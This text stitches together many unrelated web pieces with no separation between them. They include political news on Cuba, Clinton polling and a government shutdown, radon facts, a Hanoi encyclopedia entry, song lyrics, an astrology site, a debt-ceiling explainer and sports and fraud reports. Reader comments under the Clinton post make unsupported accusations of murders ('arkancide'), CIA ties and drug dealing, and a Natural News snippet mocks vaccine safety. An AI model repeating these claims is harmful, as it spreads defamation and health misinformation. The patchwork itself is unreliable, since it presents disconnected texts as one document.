Echoing in the Republican’s remarks, Senator Menendez added that “For 60 years, the Cuban regime has been finding new ways to exploit its people. Recent information from Brazil shows how the Cuban government profits from its state-sponsored foreign medical missions, which they sell as medical diplomacy but look a lot more like indentured servitude. This bipartisan resolution sheds additional light on the Cuban regime’s role in human trafficking, and is another call for greater accountability from Cuban officials, their overseas partners, and the international community.”

The benefits of the park are immeasurable and none more important than the benefits to the children of Hollywood.
– Central Hollywood Neighborhood Council
Sunday, November 9, 2014
It was another hot and muggy August in Sacramento but that did not stop a delegation of Hollywood Central Park board members and supporters from advocating to our California State Legislators and policy makers. FHCP’s second annual Sacramento Advocacy trip included delegates from the FHCP Board of Directors, community leaders and business owners who traveled to Sacramento to brief legislators and agencies on the Park’s progress and to learn what legislation might be applicable to the Park. From meetings with Senators Kevin De Leon and Ricardo Lara to Assembly Members Richard Bloom and Ed Chau to Environmental Protection Agency Secretary Matthew Rodriguez and Natural Resources Deputy Secretary Brian Cash, the Hollywood Central Park was received with enthusiasm and support.
After two days packed with meetings the delegation walked away with a plethora of information, such as how recent Cap and Trade legislation could benefit the Park by creating an urban forest and affordable housing, how the Conference Center in Salt Lake City was built with a soil that is 50% more light weight than traditional soil and how to preserve the existing affordable housing stock along the edges of the Park.
A successful trip to be sure, the FHCP delegation is looking forward to returning to Sacramento next summer to continue its work to build the Hollywood Central Park.

There are 21,000 deaths each year related to Radon in the form of lung cancer.
Radon: Test, Fix, Save A Life. Test your home!
Basic Radon Facts
Radon is a cancer-causing, radioactive gas.
Radon is a naturally occurring radioactive gas released in rock, soil, and water from the natural decay of uranium. While levels in outdoor air pose a relatively low threat to human health, radon can accumulate to dangerous levels inside buildings. You can’t see, smell, or taste it, but an elevated radon level in your home may be affecting the health of your family.
Exposure to radon is the second leading cause of lung cancer in the United States and the number one cause among non-smokers. The U.S. Environmental Protection Agency estimates that radon causes more than 20,000 lung cancer deaths in the country each year. Only smoking causes more lung cancer deaths. If you smoke and your home has radon, your risk of lung cancer can be higher.
Radon is found all over the United States.
Radon has been found in elevated levels in homes in every state. No area of the country is free from risk. Indeed, two homes right next to each other can have vastly different radon levels. Just because your neighbor’s house does not have an elevated level of radon does not mean that your house will have a low radon level. The only way to know if your home is under the EPA action level of 4 pCi/L is to test.
High levels of radon in homes usually come from the surrounding soil. Radon gas enters through cracks and openings—such as sump pump lids and plumbing features—on the lower levels of your home. Hot spots include basements, first-floor rooms, and garages, but radon can be found anywhere in your house.
You should test for radon.
The U.S. Surgeon General recommends that all homes in the U.S. be tested for radon. Testing your house for radon is easy to do. If your house has a radon problem, you can take steps to fix it to protect yourself and your family.
How Does Radon Enter a Home?
Radon is a radioactive gas. It comes from the natural decay of uranium that is found in nearly all soils. It typically moves up through the ground to the air above and into your home through cracks and other holes in the foundation. Your home traps radon inside, where it can build up. Any home may have a radon problem. This means new and old homes, well-sealed and drafty homes, and homes with or without basements.
Radon from soil gas is the main cause of radon problems. Sometimes radon enters the home through well water. A good rule of thumb is if the radon in air levels are high, and the property’s water supply is from a private well, then a radon in water test should be performed. Public water supplies have very little radon due to the aeration process which allows radon to escape before entering your home. In a small number of homes, the building materials can give off radon, too. However, building materials rarely cause radon problems by themselves.
Common Radon Myths
My home doesn't have a basement, so my chances of having Radon are low.
Fact: Radon can be a problem in homes of all types: old homes, new homes, drafty homes, insulated homes, homes with basements, homes without basements and homes with lots of windows. Local geology, construction materials, and how the home was built are among the factors that can affect radon levels in homes.
A neighbor's radon test result is a good indication of whether you have a problem.
Fact: Radon levels can vary greatly from home to home. One house can have little to no radon, where as the house next to it might have very high and unsafe levels of Radon. The only way to know if your home has a radon problem is to test it.
Radon is only a problem in certain parts of the country.
Fact: High radon levels have been found in every state, including Northern Virginia and Washington D.C.. Radon problems do vary from area to area, but the only way to know your radon level is to test.
Buyer's & Seller's Guide to Radon EPA Map or Radon Levels by County
How to Lower the Radon Levels in Your Home
There are several ways to lower radon levels, however the most common method is called a “Sub Slab Depressurization System”. This system involves two main components, a vent pipe and a fan. The contractor will drill a large hole that goes through the slab, which is where the vent pipe will be installed. If the property has a sump pump present, then the contractor will most likely convert the sump pump to be part of the radon mitigation system as well. Sealant is applied around the pipe where it penetrates the slab, as well as to any other penetrations or cracks in the slab. If the sump pump is included in the mitigation system, then the crock lid/cover will be permanently secured and all penetrations/edges sealed. The pipe is then vented to the exterior. The next step is to create the “depressurized” condition which will draw the radon gas into the vent pipe. To do this, a fan is installed inside the pipe and wired to a dedicated circuit. Once the system is installed, another radon test needs to be performed to determine if the mitigation system has lowered the radon to acceptable levels. The test should take place at a minimum of 24 hours after the radon reduction system is installed, but no longer than 30 days from the installation.

Coordinates: 21°01′42.5″N 105°51′15.0″E﻿ / ﻿21.028472°N 105.854167°E﻿ / 21.028472; 105.854167
Hanoi (/hæˈnɔɪ/ or US /həˈnɔɪ/; Vietnamese: Hà Nội [ha˨˩ nɔj˩]) is the capital of Vietnam and the country's second largest city. Its population in 2009 was estimated at 2.6 million for urban districts and 7 million for the metropolitan jurisdiction. The number of population in 2015 was estimated at 7.7 million people. From 1010 until 1802, it was the most important political centre of Vietnam. It was eclipsed by Huế, the imperial capital of Vietnam during the Nguyễn Dynasty (1802–1945), but Hanoi served as the capital of French Indochina from 1902 to 1954. From 1954 to 1976, it was the capital of North Vietnam, and it became the capital of a reunified Vietnam in 1976, after the North's victory in the Vietnam War.
The city lies on the right bank of the Red River. Hanoi is 1,760 km (1,090 mi) north of Ho Chi Minh City and 120 km (75 mi) west of Hai Phong city.
October 2010 officially marked 1000 years since the establishment of the city. The Hanoi Ceramic Mosaic Mural is a 4 km ceramic mosaic mural created to mark the occasion.

Once And Again
I get rid of everything
And clear you out of me
You oughta know
I've been trying not to surrender
When I stare in your eyes
We got along
You got away
I crawled alone while you mingle in your pace
But everytime you show up around
We may keep it right away
I swore I wouldn't let you back here
And you've been replaced into me
But that's a pretty lie in practice
So here we go again baby
Hopeless I give a try but they ain't like you
We should wonder why we got through
I can't regret the way I'm addicted
So here I'm again running into
You, you're never right on time
And you've got me so confused
Don't settle down
Oh wanna throw it all away
Unless you're coming
I won't need to go insane
I know you care
You keep on acting just so stuck
In the lies you sell around
We're gonna agree no it's no use
We may keep on running through
I swore I wouldn't let you back here
And you've been replaced into me
But that's a pretty lie in practice
So here we go again baby
Hopeless I give a try but they ain't like you
We should wonder why we got through
I can't regret the way I'm addicted
So here I'm again running into
All the memories
That we shared together
Breaking all the pain
And we are still on the edge
Of getting into the madness
And start all over again
And now the last of us you try to save
And leave a lot to be desired
In short you couldn't make us stronger
You better go
You're so damn foolish
If I had only taken as a joke
If I had only known more about you

SpaceX To Launch NASA Satellites to Spy on Droughts and Melting Ice Sheets

According to the latest tech news, SpaceX is expected to launch twin NASA satellites along with another batch into space, which will observe how water moves on the earth. The project is called GRACE-FO, and it replaces two original GRACE satellites, which were put into the orbit in 2002. These satellites provided scientists with valuable insights about melting ice sheets, droughts, etc.
Frank Webb, GRACE-FO project scientist at NASA’s Jet Propulsion Laboratory says that water resources are important for life on earth and the way we operate civilization. Hence, it is necessary for us to understand how those resources are changing.
While in orbit, the two car-sized GRACE-FO satellites will constantly follow one another 137 miles. This configuration will be used for measuring water changes on our planet. the satellites will be to create a gravity map of the Earth by measuring the distance between the two probes. This will be done with the help of microwave signals. Any kind of changes in the map will inform the scientists about the changes in how water is distributed.

Along with this, GRACE satellites can be used to monitor droughts. In order to do this, the satellites would measure the change in underground aquifers during dry periods. Along with this, these satellites will be used to measure the general distribution of water in soil, lakes, rivers, and glaciers. To know more about this mission, watch the video below:
New satellites are expected to deliver the first data 90 days after launch. The US space agency has invested $430 million and the GFZ 77 million euros ($90.7 million) in this mission; which is expected to fly for five years at least. Keep reading iTMunch for more such space news, and developments.

CleanPopulism: Canada's new norm? On Thursday, June 7th, Doug Ford was elected as the next premier of Ontario in what has been described as Canada's dirtiest political race in recent history. In many ways, it seemed a little too familiar to the populist politics we saw in the 2016 U.S presidential campaign. Is the Ontario Election an indicator that U.S. style politics could become the new norm in Canada? This is Why is produced by @JohnODowdIRL and @Niki_Reitmayer.

CleanThis is Why: Welcome Hey, I’m Niki Reitmayer, host of a brand new podcast called, “This Is Why.” Each week we will go beyond the headlines. It’s a podcast for those who are interested in news but want the full picture. This Is Why gives you context behind the stories people are talking about, or should be talking about. We want to feel the emotion that lies under the headline – the anger, the sadness, the joy – and get a true understanding of why it matters to you, to me, our friends, and our families. We want to arm you with details and a clearer picture so you can form your own opinions. After all, news is more than just facts and stats. News is a collection of stories that affect you, your friends, and your community. We’re going to do this with help from some of the best journalists in the country…and a wicked curiosity. We’re not going to shy away from tough stories or controversial questions as we try to get to the root of what defines us as Canadians. So here’s the deal: 20 minutes a week. And together we’ll explore the news in a way that actually makes sense. The show is going to launch on Friday, June 8th. You can subscribe now to the This Is Why podcast on Apple Podcast, Google Play, or anywhere you get your favourite podcasts. Subscribe now, and I’ll talk to you on Friday. 6/1/2018 Free View in iTunes

This Is Why
by Margee Girl
Please Please cut out the music. In general the podcast would be great but I can’t get past the horrible background music. Too Much!!!!
Get rid of the background noise!!
by purley333
I think these apps would be very interesting but that constant noise/“music” in the background drove me nuts
It’s a real shame. I tried the cheating pharmacists. And one other. I just couldn’t concentrate on what they were saying with that racket playing.
Tried one another one. Same racket. Played it for my husband. He said the same.
Guess I will keep it to see if it’s in every podcast. If it is I will delete the whole thing.

Gallup: Hillary Clinton Remains More Unpopular Than Trump Two Years After The Election
While Democratic politicians and groups continue to use Hillary Clinton as a matinee draw for fundraisers and campaign events, a new Gallup poll shows Clinton remains at record lows in the polls. Indeed, she remains more unpopular than Donald Trump at 36%. Trump has a 41% popularity. It is a striking disconnect. Many of us were critical when the Democratic establishment (and virtually every Democratic member of Congress) all but guaranteed the nomination of Clinton despite every poll showing her to be unpopular and the voters seeking an anti-establishment choice. Now, even after two years of book tours and speeches, Clinton is still distinctly unpopular but Democratic groups continue to make her the face of the Democratic campaign for the midterms. It shows the hold of the Clintons on some in the Democratic ranks even though she is likely to continue to alienate many who are looking for an alternative this election.
Gallup notes that, according to past polling and trends, Clinton should become more not less popular at this point.
We have previously tracked the polling showing that Clinton would still lose to Trump in prior polls.
I admit that I have never understood the hold of the Clintons who have long been divisive and damaging figures for the party from their various scandals in Arkansas and Washington to the impeachment to the 2016 election. Nevertheless, they were incredibly nimble in placing loyalists into positions of power and, in one of the most controversial moves, effectively taking over the finances of the Democratic party before the last nomination. Even with years of worsening polls showing that Hillary Clinton remains politically radioactive for many voters and unpopular with most. Nevertheless, with both houses at stake, the Democrats are again bringing out Clinton in videos and campaign speeches.
Trump and his people must be delighted by the return of Clinton given these and past polling numbers. At the same time, Trump does not appear in the free fall that many suggest. Indeed, he is far more popular than figures like French President Emmanuel Macron, who is often celebrated as a critic.
None of this means that the Democrats are unlikely to take the House and possibly the Senate. However, they again seem willing to risk the margin with the Clintons and ignoring the clear sentiment of the voters.
Many voters are clearly willing to vote against the Republicans in opposition to Trump, but the Democrats again seem to want to replay the same message with Clinton and the Democratic establishment. The voters are not leaving the GOP because they like the Democratic establishment. To the contrary they remain as anti-establishment as they were in 2016. Those voters could well stay home if the chose is again between Trump and the Clintons.

Meanwhile, Tucker Carlson’s new book has toppled Bob Woodward’s screed about dishonesty in the White House.
The MSM and the leftists have no audience that is buying their crud
“Tucker Carlson’s new book topples Woodward from #1 on New York Times best-seller list”
https://thehill.com/homenews/media/410912-tucker-carlsons-new-book-topples-woodward-from-1-on-new-york-times-bestseller
“Ship of Fools: How a Selfish Ruling Class Is Bringing America to the Brink of Revolution”
Tucker Carlson

The reviews from verified purchasers…. off the charts

The late Michael Piper made a good case that al-CIAda drafted Hillary, Bill, and John Kerry while still attending university. One of many angles that fits is Bill using his Arkansas Governor’s mansion as a drug dealing den/HQ for CIA drug imports from central and south America (see last year’s Tom Cruise fact-based movie). And of course, the list of about a dozen of Bill’s ex-“business” associates who died mysterious deaths, including at least one alleged shotgun blast to the back of the head labeled a suicide. See “arkancide.”
al-CIAda follows the mafia rule: “keep your friends close, your enemies (60’s anti-war activists) closer.”

Re: “Hillary Clinton’s Remains More Unpopular than Trump”..,. has she passed on?
And if she has, will Chuck Schumer, Cory Booker and the Obamas pull a Slobodan Milosevic and go on tour with Hillary’s remains in a campaign to divide the country?

Who cares? Trump is a loser: read the NYT article about how Donnie and his dad went to illegal lengths to avoid paying taxes. The statute if limitations (5 years)has expired, but the IRS can put a lien against Donnie’s properties, etc., for the taxes, penalties and interest. Of course, Donnie does have the money to pay off the IRS.

tax avoidance is lawful.
people that don’t know anything about the topic sometimes think, that’s tax evasion
NYT thinks they know better than IRS. They question the valuations, but how does the IRS know about these market values and facts better now than the IRS did when it accepted them decades ago?
more crud dredged up from yesteryear. Men, women, people with jobs and reputations and savings. anybody with anything to lose, beware:
the Democrats are trying to unleash the lumpenprole on anyone they don’t like, with the flimsiest of excuses.
Vote accordingly

Hillary Clinton’s sole purpose has been to willfully enable a serial abuser of women as
a dependent and parasite.
Hillary Clinton’s life of crime began with the acceptance of a bribe from Tyson Chicken
as the Arkansas Governor’s wife 40 years ago.
Hillary Clinton’s recent crimes include abuse of power through her pay-for-play scheme
as Sec. of State, use of an illegal server, mishandling of classified material, destruction
of evidence, obstruction of justice, etc.
Barack Obama used a pseudonymous account to, ostensibly, surreptitiously
communicate electronically with the criminal, Hillary Clinton, acknowledging, de facto,
her criminal acts and being complicit in her criminal acts.
Hillary Clinton Road leads to Obama.

I’ve been watching how far JT was going to take his cult like followers down the rabbit hole with a clearly partisan political operative like Kavanaugh. And I don’t blame JT for doing what his right-wing think tanks tell him to do, everybody entitled to some extra money but jeez. If any Democrat nominee had gone off like he did, oh that’s right Democrat nominees don’t get hearing, but I digress. If any of you were sitting next to a man that acted that way in public at a bar and yelling the Clinton’s were not getting his beer fast enough, you would move away. Well, except the brown shirts that are here all the time. Don’t worry, he will get on, and how proud the right-wing is going to be right? And when Trump is found to have done something illegal, I’m sure JT will show off his pictures of his vacations or better yet, “Guess what this Black guy was arrested for” posts. Really JT, HRC polling? So wear your red hats with pride and when the Democrats take back the house, you can all go on yelling about the deficit and how they are blocking Trump’s agenda without a bit of taste of hypocrisy.

U.S. and China on Climate Change

<!-- IMAGE -->
President Barack Obama has made combating climate change a priority for his administration. Shortly after his election, he described the urgency of the situation in no uncertain terms:Now is the time to confront this challenge once and for all. Delay is no longer an option. Denial is no longer an acceptable response. The stakes are too high. The consequences, too serious. In order to meet this enormous challenge, the United States and the People's Republic of China will need to take action. Together, our two countries account for more than 40 percent of the world's emissions of greenhouse gas pollutants such as carbon dioxide and methane. On March 16, U.S. Special Envoy for Climate Change Todd Stern and Chinese Vice Chairman Xie Zhenhua [see-eh chen-hwa] of the National Development and Reform Commission of the People's Republic of China, met at the U.S. Department of State to discuss this challenge and to prepare for international climate negotiations, which are scheduled to take place in early December in Copenhagen, Denmark. Special Envoy Stern acknowledged the broad work that China is already doing to address climate change, including China's goals to improve energy efficiency and increase the production of energy from renewable sources. The United States is committed to transforming its economy to a low-carbon model, both to spur economic growth and to sharply reduce domestic greenhouse gas emissions. To avoid the catastrophic risk of climate change, however, both countries will have to scale up their efforts. Stopping climate change, however, will require more than just action by the United States and China. Rather, the entire global community must work collaboratively to dramatically reduce greenhouse gas emissions in a way that promotes sustainable economic growth, increases energy security, and helps nations deliver greater prosperity for their people. And the time to start is not tomorrow, or the day after, but today.

INTRODUCTION TO THE READINGS
This may seem a strange question on an Astrology site. Still, I feel, you should ask yourself that question.
You are not a Middle Ages’ peasant in need of astrology to decide the time to grow corn or make hay.
In a world dominated by electric lights and gadgets, who need to know what the Sun and Moon are doing, what phase the Moon is in, even what season are we in (unless is holyday season)?
We have modern calenders, watches and computers precisely telling us all these things and more.
Who needs astrology in this modern world? We certainly don’t depend anymore on the wisdom of the Stars and Planets, we can then do without it. Or can we?
During my many years experience with clients and friends I have found that very often open minded and intelligent people still maintain a certain disdain about Astrology. This is partly due, I’m sure, to the wide spread belief (=bias) that Astrology is just another form of fortune telling and the astrologer is somewhat a psychic, or pretended psychic, receiving messages from guides or spirits.
Now, there may well be professional astrologers who resemble somehow this description, but most of us are just people like everyone else, not more or less psychic than the average person. It is Astrology itself that could be said to be psychic, because it is a language of subtle correspondences and invisible connections, giving its keen students a key to a universe full of mysteries and revelations.
To me Astrology has proven, time and again, to be a very powerful tool for better understanding the workings of the human psyche and to unravel the creative potential and possible issues and difficulties which are the birth right of every individual.
As in the Fairy Tales of old, at the birth of a child, many different Fairies gather to present their offerings of talents and good fortune. Always however a wicked and disgruntled witch also appears. She likes to cause trouble, promising faults of character and hardship. No life is ever free of these unwanted gifts. Very often though the curse uttered by the ‘bad’ witch reveals itself, in the end, as a blessing in disguise, perhaps after many trials and tribulations.
Through Astrology we can penetrate the reasons why we have created certain negative patterns in our lives through which we keep repeating the same mistakes.
An honest and insightful astrological reading will also point out those strengths and natural talents that we need to acknowledge in order to reach emotional and spiritual fulfilment and become successful at whatever we are doing.
Astrology can help in fact to shed much light on the areas of relationships, parenthood, unresolved childhood issues, sexuality, study, work, career, health, and even spirituality.
Astrology is all about rediscovering the missing link between us and the cosmos. It is about acknowledging powers greater than us in the universe and powers greater than the universe within us.
Getting a cosmic perspective on oneself and one’s life can be very refreshing. Far from making people fatalistically resigned to both their weaknesses and their pre-determined destinies, an honest astrologer will stress the potential for good, that is always there, and the fundamentally spiritual uniqueness of every incarnation.
Astrology should not be about labelling people and giving each a pre-destined role to play in life. Every destiny or set of circumstances can be experienced in so many different ways. The Horoscope, revealing the natural tendencies and given talents of each individual, can show ways of creative problem solving, to fit every temperament, giving back to each the sense of meaning and mystery that is too often lost in our modern living.
During the consultations I endeavour not to use astrological jargon, but just clear explanation of the effect of certain positions and planetary relationship. This approach will suit everyone, including individuals who know very little or nothing about Astrology.
Being suited to the lay person doesn’t mean however that these readings are very basic or superficial. I always endeavour to stress the psychological and spiritual interpretation of Astrology, avoiding the fortune-telling and mambo jumbo through which our art is still sadly exploited by many of its practitioners.
Please refer to my About page to learn about my qualifications and mission statement.
If you have a special request or a specific enquiry you like an answer about, please let me know about it and I will suggest the type of consultation that suits better your need.
With the Personal Consultation you will also receive a typescript of One Year Transits and Progressions from the Solar Fire astrological program, a guide line of daily readings to add to my own personal interpretations. To this I also add numerous printed Horoscopes: your Birth Horoscope, your Progressed Horoscope, a combination of Birth and Progressed Horoscope, plus a combination of Birth Chart, Progressions and Transits.

Thank you for your interest, kind regards, Paola Emma

Drawing Adventurously 2019 (5)
March 9, 2019 March 9, 2019 ~ Meg	
This week’s theme, dedicated to the start of March is “in like a lion.” I had every intention of trying to draw a lion, but life intrudes. My home has just gone up for sale and with a flurry of showings, I’ve had to leave the house and my art supplies behind. I am not one to take a sketch pad and draw in the car! Anyway, the lion drawing would be complex and time consuming no matter where I set up to draw. Instead I offer a glimpse of the lion-like weather we’ve been having this past week. March really did come in like a lion, with cold, snow and lots of wind! A quick sketch done with just one pencil in my small sketch pad.

Debt Clock Explained: Everything You Need to Know
By Danny Vinik | Sept. 25, 2013
Almost every year, the government spends more money than it takes in. The yearly difference in those amounts (i.e. spending minus revenues) is the deficit. If you add up all of our deficits (plus the occasional surplus), that&apos;s our total debt, measured in this ticking "debt clock" below:
national debt
However, Congress sets a limit on how much debt the federal government can take on. That&apos;s the debt ceiling.
How often do we hit the debt ceiling?
A lot. Since 1944, Congress has raised the debt ceiling 94 times: 54 times by Republicans, 40 by Democrats. In fact, we technically hit the debt ceiling on May 19 of this year.
Wait. We already hit the debt ceiling?! Why hasn&apos;t everything gone horribly wrong?
Because the Treasury Department has been using what it calls "extraordinary measures" to prevent us from actually breaching the debt ceiling. Our debt has sat at about $25 million below the $16,699,421,000,000 limit, as the Treasury has performed various actions such as delaying new investments into employee retirement funds to keep us under the debt ceiling. However, the Treasury department cannot keep doing so forever. Today, Secretary Jack Lew announced that we will officially breach the debt ceiling on October 17.
OK, so we&apos;ve hit the debt ceiling, but we won&apos;t breach it until October 17. What happens then? How bad would it be?
It would be a catastrophe. Two major things happen when we breach the debt ceiling:
1. Treasury can no longer pay all of the bills that it is lawfully required to pay. It will have to choose between paying bondholders, military service members, Medicare recipients and all other aspects of government. There is no methodology for how Treasury does this and no one knows exactly who would be paid and who wouldn&apos;t. There would be mass confusion and vital aspects of the government would shut down. It would be a disaster.
2. It would also significantly increase the U.S.&apos;s long-term debt. One of the luxuries that the U.S. government has is the ability to borrow at super-low rates, because investors deem Treasury bonds the safest asset in the world. They have never feared that the U.S. won&apos;t pay back its creditors. However, if we breach the debt ceiling, all bets are off. Creditors will have no choice but to demand higher interest rates on U.S. bonds to make up for this increased risk. In the long run, those higher interest rates will turn into nearly a trillion dollars in increased borrowing costs.
Yikes, so why don&apos;t we just raise it?
Good question. Republicans are using it as leverage to extract concessions from the president. In 2011, the last time we almost hit the debt ceiling, Republicans and Democrats agreed to a last-second deal that has now given us the $1.1 trillion in across-the-board spending cuts known as sequestration. This time around, Republicans are demanding a one-year delay in Obamacare. However, the president refuses to negotiate so that he does not set the precedent that the debt ceiling is a bargaining chip for the party not in office. The risks are too high to allow it to be used as an extortion device. Nevertheless, Republicans are undeterred and refuse to raise it without a one-year delay.
Can the president raise it without Congress?
Some journalists think that he can invoke the 14th Amendment, which states that the validity of U.S. debt cannot be questioned, and raise the debt ceiling by executive authority. Others are less certain that doing so would be legal and the president himself as ruled out using it.
So, what happens next?
Your guess is as good as mine. Some analysts think that there is no way the Republicans would ever allow us to breach the debt ceiling. Others aren&apos;t so sure. The truth is no one knows and it will be a long, scary couple of weeks while the two parties figure it out.

Robert Mueller’s declaration of NO COLLUSION between President Trump and Russia proves that the independent media was right all along
March 25, 2019 -
Posted by Ethan Huff
(Natural News) It’s official: The $30 million witch hunt by the Democrats against President Trump has turned up void, as Robert Mueller’s report, which was released over the weekend, found that neither President Trump nor any of his aides in any way conspired or coordinated with the Russian government to “interfere” with the 2016 presidential […]

(Natural News) Vaccines are so obviously and undeniably safe and effective (sarcasm) that Big Tech feels it necessary to continue to wage a full-scale censorship war against all information about vaccination that in any way challenges the Church of Mainstream Medicine’s official vaccine doctrines.

Billionaire Steyer Says He Won’t Run For President In 2020	
Posted By: Geoff Conn 30 Views
DES MOINES, Iowa (AP) — Billionaire investor and Democratic activist Tom Steyer will not run for president in 2020.
Steyer, who has paid for television ads calling for the impeachment of President Donald Trump, said Wednesday at an event in Des Moines, Iowa, that “the impeachment question” had reached “an inflection point,” and he planned to focus on that.
The decision comes as a surprise, given Steyer had been traveling the country promoting the political platform he released after November’s midterm elections.
Although Steyer opted against a presidential run, the constellation of political organizations that he has built is likely to have an impact on the presidential race and on key congressional races across the country.
Several prominent Democrats have also declined to run in 2020, including former Massachusetts Gov. Deval Patrick and lawyer Michael Avenatti.

Angry. Upset. Sad. Brokenhearted.
Army veteran Tressa Rivera has felt all of these emotions and more in the wake of a 14-day government shutdown that appears to have no end in sight. As a senior administrator with nearly two decades of federal experience under her belt, shutdowns aren’t new for Rivera. But this one feels different.
“As a vet, I also have PTSD [post-traumatic stress disorder]. My anxiety has gone up. I don’t sleep.
“This furlough, I’m starting to feel it,” Rivera said in an interview with GovLoop. “As a vet, I also have PTSD [post-traumatic stress disorder]. My anxiety has gone up. I don’t sleep. I don’t have an appetite. I’m scared of anything that looks like a potential bill outside of what I already have.”
She recently left her job at Fort Stewart, Georgia to take a position as a Human Capital Liaison with the Federal Emergency Management Agency (FEMA) in Washington, D.C. The new position required her to take a pay cut, but it came with the promise of greater upward mobility for Rivera, who has a 17-year-old daughter with her sights set on college. But the move also meant holding off on buying furniture to make her basement apartment feel like home.
Tressa Rivera and her 17-year-old daughter Reagan.
Before landing at FEMA, Rivera had been trying to get back into the emergency management field for the past decade. So when this opportunity at FEMA came up almost five months ago, it appeared to put her one step closer to her ultimate goal: becoming a federal senior executive.
But the constant threat of shutdowns, ongoing continuing resolutions, political rhetoric and uncertainty have “really left a bad taste in my mouth,” Rivera said. “I made my sacrifices just to be told I’m furloughed.”
Her last paycheck was Dec. 28, and she doesn’t know when she’ll get paid again.
Rivera’s story puts a human face on a national issue that has been picked apart, reported and re-reported with stats and all the dramatic footage of politicians facing off over border security.
To quickly recap: The federal government partially shut down Dec. 21, after a standoff ensued between President Donald Trump and Democrats. At issue is whether Congress will fund Trump’s long-promised wall along the U.S.-Mexico border. Trump is seeking $5 billion in funding for the controversial structure, but Democratic leaders have voiced firm opposition to the barrier. Agencies affected by the shutdown include the Homeland Security, Agriculture, Commerce, Justice, Transportation, Housing and Urban Development, Interior, Treasury and State departments.
Roughly 800,000 federal employees are impacted by the shutdown, which includes 380,000 who are furloughed and 420,000 who are working without pay, according to House Democratic Whip Steny H. Hoyer (D-MD).
“I feel like we are the 800,000 that are forgotten, like we’re disposable,” Rivera said. “We have eyes and ears and hearts and hopes and dreams like everyone else.”
“I feel like we are the 800,000 that are forgotten, like we’re disposable,”
“Build the wall, don’t build the wall, just don’t furlough me,” she added. “I feel like I’ve been abandoned by my government, [and] by my president. I can’t blame my agency because we are all at the mercy of Congress.”
“President Trump won the support of a majority of former service members, but his efforts to shrink the size of government significantly affects veterans and non-veterans alike,” said Mika Cross, Federal Workplace Expert and an Army veteran. “Data also shows that veterans don’t stay as long as non-veterans, even if they’ve transferred from another previous federal agency. So the impact of this shutdown on veterans and veterans with disabilities can be incredibly significant.”
Rivera: ‘I care about whether or not I can get my insulin’
As Rivera grapples with the shutdown and its financial implications, she’s also managing unexpected emergencies and lingering family issues. Her car recently broke down and she has a sick mother in California, whom she can’t visit because she can’t afford the plane ticket right now.
She’s read the online commentary from Americans who balk at the current situation and say that feds will eventually get paid. But what they don’t factor in are the fees, late payments, mortgages and bills that don’t stop just because affected federal employees are not getting a paycheck, Rivera said.
“I care about whether or not I can take my kid on her college visits,” she said. “I care whether or not I can go to the grocery store. I care whether or not my account is going to be overdrawn by the time all of my bills come out in bill pay. I care about whether or not the open enrollments that I signed up for in November are going to go through because they are supposed to go through on my 26th pay period, which happens to be this week coming up. These are the little things that people don’t factor in when they say, ‘Oh, well you guys will get back pay.’ Yeah, I don’t really care about back pay right now. I care about whether or not I can get my insulin because I’m a Type 2 diabetic.”
Shutdown Delays Hiring
It’s frustrating for feds like Rivera who are willing and able to work. She has a laptop and can work from anywhere, but federal law prohibits her from working during a shutdown. The Antideficiency Act generally restricts agencies from continuing operations funded by annual appropriations during a government shutdown.
As a human resources professional, it pains Rivera to leave unanswered messages in her inbox from potential job candidates. Offer letters have yet to be sent, too, and that worries her.
The average time to hire a federal employee in fiscal 2017 was just under 106 days. If those offers fall through because candidates turn down the job or have accepted positions elsewhere, the hiring process starts all over. “That is what is so disheartening,” Rivera said.
Even prior to the shutdown, working under a series of continuing resolutions, where funding remains flat, was stressful. “You are working under limited funds,” she said. “You have to work under confines of money that will run out on a certain date.”
When asked whether she plans to stay in the federal government, Rivera said she is refocusing her efforts on opportunities that allow her to tap into her creativity and work virtually.
This current shutdown has certainly taken its toll and has forced Rivera to look at all her career options, including those outside of government. “I’ve given so much of my life in some capacity to this Country, and when I needed them to reciprocate, they didn’t.”

Freshman Hughes leaving ECU basketball team

SMU's Ben Emelogu looks to make pass while ECU's Elijah Hughes defends during last month's American Athletic Conference tournament
Elijah Hughes played two of his best games last season at the American Athletic Conference tournament. They were also the last two games he played as a member of the East Carolina basketball team. The freshman from Beacon, N.Y., announced Monday with a post on his Twitter page that he plans to leave the Pirates and continue his college career at another school. “I would like to thank the East Carolina coaches and basketball staff for giving me the opportunity,” Hughes wrote. “I would also like to thank my teammates, professors and fans and the university for making my freshman year unforgettable. However, with much thought and consideration I have decided to transfer from East Carolina.” Hughes, a 6-foot-6 shooting guard, bounced back from an early season injury to play in 25 games, with seven starts. He ranked fifth on the team in scoring at 7.8 points per game while averaging 2.3 rebounds and 1.3 assists. Although he set a career high with 19 points against South Florida on Dec. 28, he saved his best for last by averaging 16 points while shooting 58.8 percent from the floor and 66.7 percent from 3-point range in games against Temple and SMU at the season-ending AAC tournament. Hughes is the second young player to leave ECU’s program since the end of the season. Redshirt freshman big man Deng Riak, who started 17 games while averaging 5.2 points and 3.2 rebounds, has also decided to transfer.

A former Bank of America executive has been indicted for allegedly participating in what prosecutors said was a “far-reaching conspiracy” to defraud municipal-bond investments through bid rigging.
Phillip D. Murphy, former head of Bank of America’s municipal derivatives desk, was charged with conspiracy to defraud the United States, wire fraud and conspiracy to make false entries in bank records, according to the indictment filed Thursday in federal court in Charlotte, NC.
The wire-fraud charge carries a maximum penalty of 30 years in prison; the conspiracy charges have a maximum penalty of five years.
Murphy “allegedly participated in a complex fraud scheme and conspiracies to manipulate what was supposed to be a competitive process,” said Scott D. Hammond, a deputy assistant attorney general. “The division recently convicted at trial several individuals in this investigation, which is ongoing.”
So far, 13 individuals from banks including Bank of America, JPMorgan Chase and UBS have pleaded guilty in the Justice Department’s investigation. Bank of America, JPMorgan, UBS, Wells Fargo and General Electric have paid more than $700 million in restitution and penalties.
Bank of America, which self-reported the illegal activity, has been cooperating for more than four years with Justice Department prosecutors who say that bankers paid kickbacks to CDR Financial Products to rig bids on investment contracts sold to local governments. Municipalities bought the contracts with money raised through bond sales, which allowed them to earn a return until the funds were needed for schools, roads and other public works.
From 1998 until 2006, Murphy allegedly conspired with CDR Financial Products to increase the number of and profitability of investment agreements and municipal-finance contracts that went to the bank.

The corner of Second Avenue and St. Mark's Place in 1968. AP
The “bad old days” of Times Square may be more infamous, but let’s not forget St. Marks Place, the endearingly scuzzy three-block stretch of East Eighth Street that’s been home to sexual exploration, druggie debauchery and epic human perversity for centuries.
